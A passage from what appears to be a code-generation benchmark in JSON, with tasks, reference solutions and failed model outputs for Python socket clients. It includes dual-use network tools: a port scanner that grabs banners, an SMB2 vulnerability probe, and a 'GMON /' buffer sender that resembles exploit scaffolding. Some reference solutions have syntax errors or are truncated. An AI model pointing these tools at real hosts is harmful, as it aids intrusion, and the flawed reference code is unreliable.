    "wrong_result": "```python\nimport requests\nfrom typing import Dict, Any, List\nfrom openai.types.chat import ChatCompletion, OpenAIMessage\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None:\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        payload = {\n            \"model\": self.model_type,\n            \"messages\": [{\"role\": msg.role, \"content\": msg.content} for msg in messages],\n            **self.model_config_dict\n        }\n\n        headers = {\n            \"Authorization\": f\"Bearer {self._api_key}\",\n            \"Content-Type\": \"application/json\"\n        }\n\n        response = requests.post(self._url, json=payload, headers=headers)\n        response.raise_for_status()\n\n        return self._convert_response(response.json())\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        return ChatCompletion(\n            id=samba_response.get(\"id\", \"\"),\n            choices=[{\n                \"index\": 0,\n                \"message\": {\"role\": \"assistant\", \"content\": samba_response[\"choices\"][0][\"message\"][\"content\"]},\n                \"finish_reason\": samba_response[\"choices\"][0].get(\"finish_reason\", \"stop\")\n            }],\n            created=samba_response.get(\"created\", 0),\n            model=samba_response.get(\"model\", \"\"),\n            object=\"chat.completion\",\n            usage=samba_response.get(\"usage\", {})\n        )\n```"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Create a function that scans a target host and port for open connections and service information using TCP socket communication.\n\nFunction Description: The function attempts to establish a TCP connection with a specified host and port, retrieves service information if available, and records the results in a global dictionary. It handles connection timeouts and errors gracefully.\n\nInput:\n- target (tuple): A tuple containing (host, port) where:\n  - host (str/int): The target hostname or IP address\n  - port (int): The target port number to scan\n\nOutput:\n- None: The function doesn't return any value directly but updates the global 'results' dictionary with scan results in the format:\n  {\n    host: {\n      port: {\n        'protocol': str,    # Protocol from global ports dictionary\n        'service': str,    # Either received service data or default from ports dict\n        'state': str       # 'open' if connection succeeded\n      }\n    }\n  }",
    "Canonical_solution": "import socket\nimport json\n\ndef _scan(target):\n    \"\"\"\n    Scan a target host and port for open connections and service information\n    \n    Args:\n        target (tuple): A tuple containing (host, port) to scan\n    \n    Returns:\n        None: Updates global results dictionary with scan results\n    \"\"\"\n    global ports\n    global results\n\n    try:\n        data = None\n        host, port = target\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1.0)\n        sock.connect((str(host), int(port)))\n\n        try:\n            data = sock.recv(1024)\n        except (socket.error, socket.timeout):\n            pass\n\n        sock.close()\n\n        if data:\n            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])\n            data = data.splitlines()[0] if '\\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}\n        else:\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}\n\n        results.get(host).update(item)\n\n    except (socket.error, socket.timeout):\n        pass\n    except Exception as e:\n        util.log(\"{} error: {}\".format(_scan.__name__, str(e)))",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\nresults = {}\nports = {\n    21: {'protocol': 'TCP', 'service': 'FTP'},\n    22: {'protocol': 'TCP', 'service': 'SSH'},\n    23: {'protocol': 'TCP', 'service': 'Telnet'},\n    25: {'protocol': 'TCP', 'service': 'SMTP'},\n    53: {'protocol': 'UDP', 'service': 'DNS'},\n    80: {'protocol': 'TCP', 'service': 'HTTP'},\n    110: {'protocol': 'TCP', 'service': 'POP3'},\n    143: {'protocol': 'TCP', 'service': 'IMAP'},\n    443: {'protocol': 'TCP', 'service': 'HTTPS'}\n}\n\ndef scan_host(target):\n    host, port = target\n    entry = {port: {}}\n    try:\n        with socket.create_connection((host, port), timeout=3) as sock:\n            entry[port]['state'] = 'open'\n            entry[port]['protocol'] = ports.get(port, {}).get('protocol', 'unknown')\n            entry[port]['service'] = ports.get(port, {}).get('service', 'unknown')\n            sock.setblocking(0)\n            try:\n                data = sock.recv(1024).decode(errors='ignore').strip()\n                if data:\n                    entry[port]['service'] = data\n            except:\n                pass\n    except (socket.timeout, ConnectionRefusedError, OSError):\n        entry[port]['state'] = 'closed'\n        entry[port]['protocol'] = ports.get(port, {}).get('protocol', 'unknown')\n        entry[port]['service'] = ports.get(port, {}).get('service', 'unknown')\n\n    results.setdefault(host, {}).update(entry)\n```"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a TCP client class for communicating with an Android device through an ADB bridge, handling connection management, data transmission, and error recovery.\n\nClass Description: AdbConnector - A class that establishes and maintains a TCP connection to an Android device via ADB bridge, providing methods for sending requests and receiving responses.\n\nAttributes:\n- adb_host: str - The host address where ADB is running (default: 'localhost')\n- socket: socket - The TCP socket object for communication\n- packet_buffer: bytes - Buffer for storing incomplete packets\n- _disposed: bool - Flag indicating whether the connection has been closed\n- adb_proc: Popen - Subprocess object for the ADB bridge process\n\nMethods:\n- __init__(adb_host: str = 'localhost') -> None - Initializes the ADB connector with the specified host\n- _relaunch_adb_bridge() -> None - Restarts the ADB bridge connection when needed\n- send_request(packet_type: int, packet_payload: bytes) -> None - Sends a request packet to the device\n- read_loop() -> None - Continuously reads and processes incoming data from the device\n- dispose(disposing: bool = True) -> None - Cleans up resources and closes the connection",
    "Canonical_solution": "from subprocess import Popen, run, PIPE, DEVNULL, STDOUT, TimeoutExpired, list2cmdline\nfrom socket import socket, AF_INET, SOCK_STREAM\nfrom functools import partial\nfrom typing import Optional\nfrom os.path import exists\nfrom re import search\n\nQCSUPER_TCP_PORT = 43555\n\nclass AdbConnector:\n    def __init__(self, adb_host: str = 'localhost'):\n        self.adb_host = adb_host\n        self.socket = socket(AF_INET, SOCK_STREAM)\n        self.packet_buffer = b''\n        self._disposed = False\n\n    def _relaunch_adb_bridge(self):\n        if hasattr(self, 'adb_proc'):\n            self.adb_proc.terminate()\n        \n        run_safe([self.adb_exe, 'forward', 'tcp:' + str(QCSUPER_TCP_PORT), 'tcp:' + str(QCSUPER_TCP_PORT)], check = True,\n                stdout = DEVNULL, stdin = DEVNULL)\n        \n        self.adb_proc = Popen([self.adb_exe, 'exec-out' if self.can_use_exec_out else 'shell', self.su_command % (ANDROID_TMP_DIR + '/adb_bridge')],\n            stdin = DEVNULL, stdout = PIPE, stderr = STDOUT,\n            preexec_fn = (lambda: partial(drop_privileges, True)) if drop_privileges else None,\n            bufsize = 0, universal_newlines = True\n        )\n    \n        for line in self.adb_proc.stdout:\n            if 'Connection to Diag established' in line:\n                break\n            else:\n                warning('Unexpected adb_bridge output: ' + line)\n\n        self.socket = socket(AF_INET, SOCK_STREAM)\n\n        try:\n            self.socket.connect((self.adb_host, QCSUPER_TCP_PORT))\n        except Exception:\n            self.adb_proc.terminate()\n            error('Could not communicate with the adb_bridge through TCP')\n            exit()\n        \n        self.received_first_packet = False\n\n    def send_request(self, packet_type, packet_payload):\n        raw_payload = self.hdlc_encapsulate(bytes([packet_type]) + packet_payload\n        self.socket.send(raw_payload)\n\n    def read_loop(self):\n        while True:\n            while self.TRAILER_CHAR not in self.packet_buffer:\n                socket_read = self.socket.recv(1024 * 1024 * 10)\n                \n                if not socket_read and platform in ('cygwin', 'win32'):\n                    self._relaunch_adb_bridge()\n                    \n                    if not self.program_is_terminating:\n                        with self.shutdown_event:\n                            self.shutdown_event.notify()\n                    \n                    socket_read = self.socket.recv(1024 * 1024 * 10)\n                \n                if not socket_read:\n                    error('\\nThe connection to the adb bridge was closed, or ' +\n                        'preempted by another QCSuper instance')\n                    return\n                \n                self.packet_buffer += socket_read\n            \n            while self.TRAILER_CHAR in self.packet_buffer:\n                raw_payload, self.packet_buffer = self.packet_buffer.split(self.TRAILER_CHAR, 1)\n                \n                try:\n                    unframed_message = self.hdlc_decapsulate(\n                        payload = raw_payload + self.TRAILER_CHAR\n                    )\n                except self.InvalidFrameError:\n                    continue\n                finally:\n                    self.received_first_packet = True\n                \n                self.dispatch_received_diag_packet(unframed_message)\n\n    def dispose(self, disposing=True):\n        if not self._disposed:\n            if hasattr(self, 'adb_proc'):\n                self.adb_proc.terminate()\n            self._disposed = True",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport subprocess\nimport threading\nfrom typing import Optional\n\nclass AdbConnector:\n    def __init__(self, adb_host: str = 'localhost') -> None:\n        self.adb_host = adb_host\n        self.socket: Optional[socket.socket] = None\n        self.packet_buffer: bytes = b''\n        self._disposed: bool = False\n        self.adb_proc: Optional[subprocess.Popen] = None\n        self._relaunch_adb_bridge()\n\n    def _relaunch_adb_bridge(self) -> None:\n        if self._disposed:\n            return\n        if self.socket:\n            self.socket.close()\n        if self.adb_proc:\n            self.adb_proc.terminate()\n            self.adb_proc.wait()\n        self.adb_proc = subprocess.Popen(['adb', 'exec-out', 'tcpip', '5555'], stdout=subprocess.PIPE)\n        self.socket = socket.create_connection((self.adb_host, 5555))\n        read_thread = threading.Thread(target=self.read_loop)\n        read_thread.start()\n\n    def send_request(self, packet_type: int, packet_payload: bytes) -> None:\n        if self._disposed or not self.socket:\n            raise RuntimeError(\"Connection is disposed or not established\")\n        header = (packet_type).to_bytes(4, byteorder='big') + len(packet_payload).to_bytes(4, byteorder='big')\n        self.socket.sendall(header + packet_payload)\n\n    def read_loop(self) -> None:\n        while not self._disposed and self.socket:\n            try:\n                data = self.socket.recv(4096)\n                if not data:\n                    break\n                self.packet_buffer += data\n                # Process packets as needed\n            except (ConnectionResetError, OSError):\n                self._relaunch_adb_bridge()\n                break\n\n    def dispose(self, disposing: bool = True) -> None:\n        if self._disposed:\n            return\n        self._disposed = True\n        if self.socket:\n            self.socket.close()\n        if self.adb_proc:\n            self.adb_proc.terminate()\n            self.adb_proc.wait()\n```"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Python class that collects and processes statistics from Twemproxy (a fast, lightweight proxy for memcached and Redis) using TCP socket communication.\n\nClass Description: TwemproxyStatsCollector is a class designed to connect to Twemproxy instances, retrieve statistics in JSON format, and process them into structured dictionaries for gauges and pool metrics.\n\nAttributes:\nGAUGES: [list] - A list of metric names that should be treated as gauge values (numeric values that can go up and down)\nIGNORED: [list] - A list of field names that should be ignored when processing the statistics\n\nMethods:\nget_raw_stats: [Name](host, port) -> [dict] - Establishes a TCP connection to the specified Twemproxy instance and retrieves raw statistics in JSON format\nget_stats: [Name](host, port) -> [tuple(dict, dict)] - Processes raw statistics into two dictionaries: one for general stats and one for pool/server metrics\ncollect_stats: [Name](hosts) -> [dict] - Collects statistics from multiple Twemproxy hosts and organizes them by alias/hostname",
    "Canonical_solution": "import socket\nimport json\nimport re\n\nclass TwemproxyStatsCollector:\n    GAUGES = [\n        'uptime',\n        'curr_connections',\n        'client_connections',\n        'server_connections',\n        'server_ejected_at',\n        'in_queue',\n        'in_queue_bytes',\n        'out_queue',\n        'out_queue_bytes'\n    ]\n\n    IGNORED = [\n        'service',\n        'source',\n        'timestamp',\n        'version'\n    ]\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n\n            stats_data = ''\n            while True:\n                data = sock.recv(1024)\n                if not data:\n                    break\n                stats_data += data\n            sock.close()\n\n        except socket.error:\n            raise Exception('Failed to get stats from %s:%s' % (host, port))\n\n        try:\n            return json.loads(stats_data)\n        except (TypeError, ValueError):\n            raise ValueError(\"Unable to parse response from Twemproxy as a json object\")\n\n    def get_stats(self, host, port):\n        data = self.get_raw_stats(host, port)\n        if data is None:\n            return {}, {}\n\n        stats = {}\n        pools = {}\n        for stat, value in data.iteritems():\n            if isinstance(value, dict):\n                pool_name = stat.replace('.', '_')\n                pools[pool_name] = {}\n                for pool_stat, pool_value in value.iteritems():\n                    if isinstance(pool_value, dict):\n                        server_name = pool_stat.replace('.', '_')\n                        pools[pool_name][server_name] = {}\n                        for server_stat, server_value in pool_value.iteritems():\n                            pools[pool_name][server_name][server_stat] = int(server_value)\n                    else:\n                        pools[pool_name][pool_stat] = int(pool_value)\n            else:\n                if stat not in self.IGNORED:\n                    stats[stat] = int(value)\n\n        return stats, pools\n\n    def collect_stats(self, hosts):\n        if isinstance(hosts, basestring):\n            hosts = [hosts]\n\n        results = {}\n        for host in hosts:\n            matches = re.search('((.+)\\@)?([^:]+)(:(\\d+))?', host)\n            alias = matches.group(2) or matches.group(3)\n            hostname = matches.group(3)\n            port = matches.group(5)\n\n            stats, pools = self.get_stats(hostname, port)\n            results[alias] = {\n                'stats': stats,\n                'pools': pools\n            }\n\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport json\n\nclass TwemproxyStatsCollector:\n    GAUGES = [\n        \"total_connections\", \"current_connections\", \"rejected_connections\",\n        \"request_count\", \"response_count\", \"total_request_bytes\",\n        \"total_response_bytes\"\n    ]\n\n    IGNORED = [\"time\"]\n\n    def get_raw_stats(self, host, port):\n        with socket.create_connection((host, port), timeout=5) as sock:\n            sock.sendall(b\"stats\\r\\n\")\n            data = b\"\"\n            while True:\n                chunk = sock.recv(4096)\n                if not chunk:\n                    break\n                data += chunk\n                if b\"\\r\\nEND\\r\\n\" in data:\n                    break\n            raw_json = data.decode().split(\"STAT \", 1)[1].rsplit(\"\\r\\nEND\\r\\n\", 1)[0]\n            return json.loads(\"{\" + raw_json.replace(\"\\r\\n\", \", \").replace(\"STAT \", \"\") + \"}\")\n\n    def get_stats(self, host, port):\n        raw_data = self.get_raw_stats(host, port)\n        general_stats = {}\n        pool_metrics = {}\n\n        for key, value in raw_data.items():\n            if key in self.IGNORED:\n                continue\n            if key.startswith(\"pool.\"):\n                pool_key = key[5:]\n                if isinstance(value, dict):\n                    for subkey, subvalue in value.items():\n                        full_key = f\"{pool_key}.{subkey}\"\n                        if subkey in self.GAUGES:\n                            pool_metrics[full_key] = float(subvalue)\n                        else:\n                            pool_metrics[full_key] = subvalue\n                else:\n                    pool_metrics[key] = value\n            elif key in self.GAUGES:\n                general_stats[key] = float(value)\n            else:\n                general_stats[key] = value\n\n        return general_stats, pool_metrics\n\n    def collect_stats(self, hosts):\n        all_stats = {}\n        for alias, (host, port) in hosts.items():\n            try:\n                general, pools = self.get_stats(host, port)\n                all_stats[alias] = {\n                    \"general\": general,\n                    \"pools\": pools\n                }\n            except Exception as e:\n                all_stats[alias] = {\"error\": str(e)}\n        return all_stats\n```"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified host, sends an SMB2 negotiation packet, and processes the server's response to determine SMBv2 support and potential vulnerabilities.\n\nFunction Description: The function connects to a target host using TCP, constructs and sends an SMB2 negotiation packet, then analyzes the response to check for SMBv2 support and potential vulnerabilities. The function handles socket operations including connection, timeout setting, data sending/receiving, and proper connection closure.\n\nInput:\n- host: tuple - A tuple containing (IP_address: str, port: int) representing the target server's address and port\n\nOutput:\n- None (prints messages to console about SMBv2 support and potential vulnerabilities)\n- Raises exceptions for connection or communication errors\n\nThe function performs the following key operations:\n1. Creates a TCP/IPv4 socket\n2. Connects to the specified host with a 5-second timeout\n3. Constructs SMB2 negotiation packet with appropriate headers\n4. Sends the packet prefixed with its length\n5. Receives and analyzes the server response\n6. Determines SMBv2 support from the response\n7. Checks for potential vulnerabilities if SMBv2 is supported\n8. Closes the connection properly in all cases",
    "Canonical_solution": "import sys\nimport os\nimport datetime\nimport struct\nimport socket\n\nsys.path.insert(0, os.path.realpath(os.path.join(os.path.dirname(__file__), '..')))\nfrom packets import SMB2Header, SMB2Nego, SMB2NegoData\n\ndef run(host):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(host)  \n    s.settimeout(5) \n\n    Header = SMB2Header(Cmd=\"\\x72\",Flag1=\"\\x18\",Flag2=\"\\x53\\xc8\")\n    Nego = SMB2Nego(Data = SMB2NegoData())\n    Nego.calculate()\n\n    Packet = str(Header)+str(Nego)\n    Buffer = struct.pack(\">i\", len(Packet)) + Packet\n    s.send(Buffer)\n\n    try:\n        data = s.recv(1024)\n        if data[4:5] == \"\\xff\":\n           print \"This host doesn't support SMBv2\" \n        if data[4:5] == \"\\xfe\":\n           IsDCVuln(GetBootTime(data[116:124]))\n    except Exception:\n        s.close()\n        raise",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef check_smb2_negotiation(host):\n    ip, port = host\n    sock = None\n    try:\n        sock = socket.create_connection((ip, port), timeout=5)\n        sock.settimeout(5)\n\n        # SMB2 Negotiate Request packet\n        negotiate_packet = b'\\x00\\x00\\x00\\x90'  # Length (144 bytes)\n        negotiate_packet += b'\\x02\\x43'          # Protocol Version (SMB2.02)\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Credit Charge\n        negotiate_packet += b'\\xff\\xff\\x00\\x00'  # Flags\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Next Command\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Message ID\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Reserved\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Tree ID\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Process ID\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # User ID\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Session ID\n        negotiate_packet += b'\\x00\\x00\\x00\\x00' * 4  # Signature\n        negotiate_packet += b'\\x00\\x00\\x00\\x0f'  # Structure Size\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Security Mode\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Requested Maximum Message Size\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Requested System Time (8 bytes placeholder)\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Requested Server Time Zone (4 bytes placeholder)\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Requested GUID (16 bytes placeholder)\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Capabilities\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Channel Information Offset\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Channel Information Length\n        negotiate_packet += b'\\x00\\x00\\x00\\x00'  # Previous Session ID\n\n        sock.send(negotiate_packet)\n\n        response_length = int.from_bytes(sock.recv(4), 'little')\n        response_data = sock.recv(response_length)\n\n        if len(response_data) >= 4 and response_data[0:2] == b'\\xfe\\x53':\n            print(\"Server supports SMBv2 protocol.\")\n            # Basic vulnerability check for known issues in SMBv2\n            if b'\\x02\\x43' in response_data:\n                print(\"Potential vulnerability: SMBv2 is enabled without proper security measures.\")\n        else:\n            print(\"Server does not support SMBv2 protocol.\")\n\n    except socket.timeout:\n        raise Exception(\"Connection timed out while waiting for the server response.\")\n    except socket.error as e:\n        raise Exception(f\"Socket error occurred: {e}\")\n    finally:\n        if sock:\n            sock.close()\n```"
  },
  {
    "Task_id": 338,
    "Instruction": "Task Description: Create a TCP client class for interacting with the IQFeed server to send commands and receive market data.\n\nClass Description: The IQFeedClient class establishes and manages a TCP connection to an IQFeed server, allowing users to send commands/queries and receive responses. It handles connection setup, data transmission, error handling, and connection teardown.\n\nAttributes:\n_host: str - The hostname or IP address of the IQFeed server (default: 'localhost')\n_port: int - The port number for the IQFeed server connection (default: 9100)\n_timeout: float - The connection timeout in seconds (default: 10.0)\n_recv_buf: str - Buffer for storing received data\n_sock: socket.socket - The TCP socket object for server communication\n\nMethods:\n__init__(host: str = 'localhost', port: int = 9100, timeout: float = 10.0) -> None - Initializes the client with connection parameters and establishes the TCP connection\n_send_cmd(cmd: str) -> None - Sends a command string to the IQFeed server (private method)\nquery(message: str) -> Optional[List[str]] - Sends a query message to the server and returns the parsed response data\nclose() -> None - Closes the socket connection to the server",
    "Canonical_solution": "import socket\nimport logging\nimport numpy as np\nimport pandas as pd\n\nclass IQFeedClient:\n    def __init__(self, host: str = 'localhost', port: int = 9100, timeout: float = 10.0):\n        self._host = host\n        self._port = port\n        self._timeout = timeout\n        self._recv_buf = \"\"\n        \n        # Create and configure socket\n        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._sock.connect((self._host, self._port))\n        self._sock.settimeout(self._timeout)\n\n    def _send_cmd(self, cmd: str):\n        \"\"\"Send command to IQFeed server\"\"\"\n        self._sock.sendall(cmd.encode(encoding='latin-1', errors='strict'))\n\n    def query(self, message: str):\n        \"\"\"Send query to IQFeed server and receive response\"\"\"\n        end_msg = '!ENDMSG!'\n        recv_buffer = 4096\n\n        self._send_cmd(message)\n\n        chunk = \"\"\n        data = \"\"\n        while True:\n            chunk = self._sock.recv(recv_buffer).decode('latin-1')\n            data += chunk\n            if chunk.startswith('E,'):  # error condition\n                if chunk.startswith('E,!NO_DATA!'):\n                    logging.warn('No data available for the given symbol or dates')\n                    return None\n                else:\n                    raise Exception(chunk)\n            elif end_msg in chunk:\n                break\n\n        # Clean up the data\n        data = data[:-1 * (len(end_msg) + 3)]\n        data = \"\".join(data.split(\"\\r\"))\n        data = data.replace(\",\\n\", \",\")[:-1]\n        return data.split(\",\")\n\n    def close(self):\n        \"\"\"Close the socket connection\"\"\"\n        self._sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nfrom typing import Optional, List\n\nclass IQFeedClient:\n    def __init__(self, host: str = 'localhost', port: int = 9100, timeout: float = 10.0) -> None:\n        self._host = host\n        self._port = port\n        self._timeout = timeout\n        self._recv_buf = ''\n        self._sock = socket.create_connection((self._host, self._port), timeout=self._timeout)\n\n    def _send_cmd(self, cmd: str) -> None:\n        self._sock.sendall(f'{cmd}\\r\\n'.encode('ascii'))\n\n    def query(self, message: str) -> Optional[List[str]]:\n        self._send_cmd(message)\n        response_lines = []\n        while True:\n            try:\n                data = self._sock.recv(4096).decode('ascii')\n                if not data:\n                    break\n                self._recv_buf += data\n                lines = self._recv_buf.split('\\r\\n')\n                complete_lines = lines[:-1]\n                last_line = lines[-1]\n                if last_line == '':\n                    self._recv_buf = ''\n                else:\n                    self._recv_buf = last_line\n                response_lines.extend(complete_lines)\n                if response_lines and response_lines[-1] == '':\n                    response_lines.pop()\n            except socket.error as e:\n                print(f'Socket error: {e}')\n                return None\n            if '\\r\\n' in self._recv_buf:\n                break\n        return response_lines\n\n    def close(self) -> None:\n        self._sock.close()\n```"
  },
  {
    "Task_id": 339,
    "Instruction": "Task Description: Create a Python class that implements TCP client functionality for testing server connections and sending data to a server.\n\nClass Description: The TargetSocket class provides TCP client capabilities to check server availability and send data to a specified port on localhost. It handles connection establishment, data transmission, and proper resource cleanup.\n\nAttributes:\n- sock: [socket.socket] - The socket object used for TCP communication (initially None)\n- targetPort: [int] - The target port number for server communication (default: 5001)\n\nMethods:\n- testServerConnectionTcp() -> [bool] - Tests if a connection can be established with the target server. Returns True if successful, False otherwise.\n- sendToSocket(data: str) -> [bool] - Attempts to send the provided string data to the target server. Makes up to 10 connection attempts with 100ms delays between attempts. Returns True if data was sent successfully, False otherwise.",
    "Canonical_solution": "import socket\n\nclass TargetSocket:\n    def __init__(self, target_port=5001):\n        self.sock = None\n        self.targetPort = target_port\n\n    def testServerConnectionTcp(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_address = ('localhost', self.targetPort)\n\n        try:\n            sock.connect(server_address)\n        except socket.error as exc:\n            return False\n\n        sock.close()\n        return True\n\n    def sendToSocket(self, data):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n\n        host = 'localhost'\n        port = self.targetPort\n\n        isOpen = False\n        n = 0\n        while isOpen is False:\n            try:\n                s.connect((host, port))\n                isOpen = True\n            except Exception as e:\n                time.sleep(0.1)\n                n += 1\n                isOpen = False\n\n            if n == 10:\n                return False\n\n        try:\n            s.send(str.encode(data))\n        except Exception as e:\n            print(\"B: \" + str(e))\n\n        s.close()\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport time\n\nclass TargetSocket:\n    def __init__(self, targetPort: int = 5001):\n        self.sock = None\n        self.targetPort = targetPort\n\n    def testServerConnectionTcp(self) -> bool:\n        try:\n            self.sock = socket.create_connection((\"localhost\", self.targetPort), timeout=2)\n            self.sock.close()\n            return True\n        except Exception:\n            return False\n\n    def sendToSocket(self, data: str) -> bool:\n        for _ in range(10):\n            try:\n                self.sock = socket.create_connection((\"localhost\", self.targetPort), timeout=2)\n                self.sock.sendall(data.encode('utf-8'))\n                self.sock.close()\n                return True\n            except Exception:\n                time.sleep(0.1)\n        return False\n```"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Create a function to crawl content from Weixin Official Account Platform (mp.weixin.qq.com) URLs using HTTP requests with proper error handling and logging.\n\nFunction Description: The function mp_crawler takes a URL and a logger object as input, validates the URL, makes an HTTPS request to the Weixin Official Account Platform, and returns a status code along with response data (empty in case of errors). It includes URL validation, HTTP request handling with timeout, and proper error logging.\n\nInput:\n- url: str - The target URL to crawl (must be from mp.weixin.qq.com domain)\n- logger: logging.Logger - Logger object for recording warnings and errors\n\nOutput:\n- Tuple[int, dict] - Returns a tuple containing:\n  - First element: int status code (-5 for invalid URL, -7 for request failure, or HTTP status code for success)\n  - Second element: dict containing response data (empty dict in case of errors)",
    "Canonical_solution": "import httpx\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\nimport re\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'}\n\ndef mp_crawler(url: str, logger) -> (int, dict):\n    if not url.startswith('https://mp.weixin.qq.com') and not url.startswith('http://mp.weixin.qq.com'):\n        logger.warning(f'{url} is not a mp url, you should not use this function')\n        return -5, {}\n\n    url = url.replace(\"http://\", \"https://\", 1)\n\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport re\nimport requests\nfrom typing import Tuple, Dict\nfrom urllib.parse import urlparse\n\n\ndef mp_crawler(url: str, logger) -> Tuple[int, Dict]:\n    if not re.match(r'^https?://mp\\.weixin\\.qq\\.com', url):\n        logger.warning(f\"Invalid URL domain: {url}\")\n        return -5, {}\n\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        return response.status_code, {\"html\": response.text}\n    except requests.RequestException as e:\n        logger.error(f\"Request failed for {url}: {e}\")\n        return -7, {}\n```"
  },
  {
    "Task_id": 341,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a server, receives initial data from the server, sends a buffer with a specific prefix, and handles connection errors gracefully.\n\nFunction Description: The function `send_buffer_to_server` creates a TCP socket, connects to a specified server, receives initial data, sends a buffer prefixed with \"GMON /\", and ensures proper connection closure. It includes error handling for connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The data buffer to be sent to the server (will be prefixed with \"GMON /\")\n\nOutput:\n- None (prints status messages to console: received data, error messages, and confirmation of buffer sending)",
    "Canonical_solution": "import socket\n\ndef send_buffer_to_server(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print \"\\n\" + data\n        s.send(\"GMON /\" + buffer + '\\r\\n')\n    except:\n        print \"Check your debugger\"\n    finally:\n        s.close()\n        print \"Buffer Sent!\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef send_buffer_to_server(host, port, buffer):\n    try:\n        with socket.create_connection((host, port), timeout=10) as sock:\n            initial_data = sock.recv(4096)\n            if initial_data:\n                print(\"Received:\", initial_data.decode(errors='ignore'))\n\n            message = f\"GMON /{buffer}\\n\"\n            sock.sendall(message.encode())\n            print(\"Buffer sent successfully.\")\n    except (socket.error, socket.timeout) as e:\n        print(f\"Connection error: {e}\")\n```"
  },
  {
    "Task_id": 342,
    "Instruction": "Task Description: Create a Python function that establishes a TCP client connection to a server, sends a message, and continuously receives responses from the server.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a predefined or custom message, and enters a loop to continuously receive and print responses from the server until manually interrupted. The connection is closed after the loop exits (though in practice, the loop is infinite and `s.close()` may not be reached).\n\nInput:\n- `host` (str, optional): The IP address or hostname of the target server. Defaults to \"localhost\".\n- `port` (int, optional): The port number of the target server. Defaults to 5001.\n- `message` (bytes, optional): The message to send to the server. Defaults to a predefined GPS tracker message in bytes format.\n\nOutput: None (The function prints received data to the console but does not return any value).",
    "Canonical_solution": "import socket\nimport binascii\n\ndef tcp_client_communication(host=\"localhost\", port=5001, message=b\"imei:123456789012345,tracker,151030080103,,F,000101.000,A,5443.3834,N,02512.9071,E,0.00,0;\"):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    \n    while True:\n        print(s.recv(1024))\n    \n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
